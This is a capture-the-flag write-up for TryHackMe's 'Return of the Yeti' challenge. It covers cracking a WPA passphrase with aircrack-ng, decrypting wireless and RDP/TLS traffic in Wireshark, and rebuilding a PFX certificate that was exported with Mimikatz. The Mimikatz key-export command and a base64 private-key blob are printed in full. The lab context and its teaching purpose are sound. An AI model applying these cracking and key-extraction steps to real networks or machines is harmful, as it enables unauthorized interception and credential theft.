# The Return of the Yeti

## Executive Summary

This report details the methodology and findings from the "The Return of the Yeti" challenge in the Advent of Cyber 2023 Side Quest on TryHackMe. The challenge involved analyzing a packet capture file to uncover sensitive information, including WPA key cracking, RDP traffic decryption, and flag extraction. The objective was to simulate an offensive security scenario where an attacker intercepts and decrypts network traffic to gain unauthorized access to data.

Key findings include:
- WPA passphrase: "Christmas"
- Case number: "31337-0"
- Yeti key content: 

## Tools Used

- **Wireshark**: For packet analysis and decryption.
- **Tshark**: Command-line tool for packet manipulation.
- **Aircrack-ng**: For WPA key cracking.
- **Mimikatz**: For extracting certificates and private keys.
- **OpenSSL**: For handling certificates and keys.
- **PowerShell**: For file manipulation and Base64 encoding/decoding.

## Methodology

The approach followed a systematic process:
1. **Initial Reconnaissance**: Examine the provided files and identify the packet capture.
2. **WPA Cracking**: Use dictionary attack to recover the WPA passphrase.
3. **Traffic Decryption**: Configure Wireshark to decrypt WPA and TLS traffic.
4. **RDP Analysis**: Focus on TPKT protocol to extract RDP session data.
5. **Data Extraction**: Manually reconstruct data from packet bytes to find flags and sensitive information.

## Step-by-Step Walkthrough

### Step 1: Install Task and Extract Files

Download and extract the challenge files. The main file is `VanSpy.pcapng`, a packet capture containing wireless traffic.

### Step 2: Initial Packet Analysis

Open `VanSpy.pcapng` in Wireshark to inspect the capture. Identify the SSID:

```
SSID="FreeWifiBFC"
```

### Step 3: Convert Packet Format

Use Tshark to convert the capture to a compatible format for Aircrack-ng:

```bash
tshark -F pcap -r VanSpy.pcapng -w VanSpy.pcap
```

Note: The command may produce warnings about private keys, but proceed as they are not required for this step.

Verify the files in the directory:

```bash
ls
```

Output:
```
README.md  VanSpy-1700925570622.pcapng.zip  VanSpy.pcap  VanSpy.pcapng
```

### Step 4: Crack WPA Passphrase

Use Aircrack-ng with the RockYou wordlist to perform a dictionary attack on the WPA handshake:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 22:c7:12:c7:e2:35 VanSpy.pcap
```

Alternative commands (all yield the same result):

```bash
aircrack-ng VanSpy.pcap -w /usr/share/wordlists/rockyou.txt
aircrack-ng VanSpy.pcap -e FreeWifiBFC -w /usr/share/wordlists/rockyou.txt
```

Output (truncated for brevity):
```
Reading packets, please wait...
Opening VanSpy.pcap
Read 45243 packets.

1 potential targets

                               Aircrack-ng 1.7

      [00:00:02] 34342/10303727 keys tested (22655.66 k/s)

      Time left: 7 minutes, 33 seconds                           0.33%

                           KEY FOUND! [ Christmas ]

      Master Key     : A8 3F 1D 1D 1D 1F 2D 06 8E D4 47 CE E9 FD 3A AA
                       B2 86 42 89 FA F8 49 93 D7 C1 A0 29 97 3D 44 9F

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : C1 0A 70 D9 65 94 5B 57 F2 98 8A E0 FC FD 2B 22
```

The WPA passphrase is "Christmas".

### Step 5: Configure Wireshark for Decryption

1. Open Wireshark and go to Edit > Preferences > Protocols > IEEE 802.11.
2. In the Decryption keys section, add a new key:
   - Key type: wpa-pwd
   - Key: Christmas
3. Click OK to apply.

This allows decryption of WPA-encrypted packets.

### Step 6: Analyze RDP Traffic

Filter for TCP stream related to RDP:

```
tcp.stream eq 1005
```

Follow the TCP stream for stream 44641 to view the RDP session data.

The stream reveals a PowerShell session on the target machine (INTERN-PC) as Administrator.

Key commands executed in the session:
- Directory listing
- User identification
- Download and extraction of Mimikatz
- Certificate extraction using Mimikatz

### Step 7: Extract Private Key

From the PowerShell output, Mimikatz was used to export the Remote Desktop certificate:

```bash
cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:\"Remote Desktop\" /export" exit
```

This generated `LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx`.

The certificate was then Base64 encoded:

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
```

The Base64 string is provided in the capture (truncated in this report for brevity).

### Step 8: Rebuild Certificate File

To decrypt TLS traffic, rebuild the .pfx file from the Base64 string:

```powershell
$Base64String = "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"
$Bytes = [Convert]::FromBase64String($Base64String)
[IO.File]::WriteAllBytes("C:\Users\andre\Downloads\VanSpy\cert.pfx", $Bytes)
```

### Step 9: Configure TLS Decryption in Wireshark

1. Go to Edit > Preferences > Protocols > TLS.
2. In RSA keys list, add the .pfx file.
3. Alternatively, extract .pem and RSA key using OpenSSL for more options.

### Step 10: Extract Data from RDP Packets

Focus on TPKT protocol for RDP traffic. Filter:

```
(tpkt) && (ip.src == 10.1.1.1)
```

Examine packets and extract VirtualChannelData bytes manually.

Key packets and extracted data:
- Packet 13913: "https://mail.google.com/mail/u/0/?tab=rm&ogbl#inbox"
- Packet 17870: "31337-0"
- Packet 28067: "thanks for looking into this. Having Frost-eau in the case is for sure great! p.s. I'll copy the weird file I found and send it to you through a more secure channel. Regards Elf McSkidy"

This reveals the case number: 31337-0.

Further analysis of packets 34383 and 35547:
- Packet 34383: "yetikey1.txt"
- Packet 35547: "**************************"

This is the content of yetikey1.txt.

## Findings

- **WPA Passphrase**: Christmas
- **Case Number**: 31337-0
- **Yeti Key**: ***********************
## Conclusion

The challenge demonstrated the importance of securing wireless networks and encrypting sensitive traffic. Weak passphrases and unencrypted RDP sessions can lead to data exposure. Recommendations include using strong, unique passwords, enabling WPA3, and using VPNs for remote access.

This report provides a complete walkthrough for educational purposes in the context of the TryHackMe CTF.
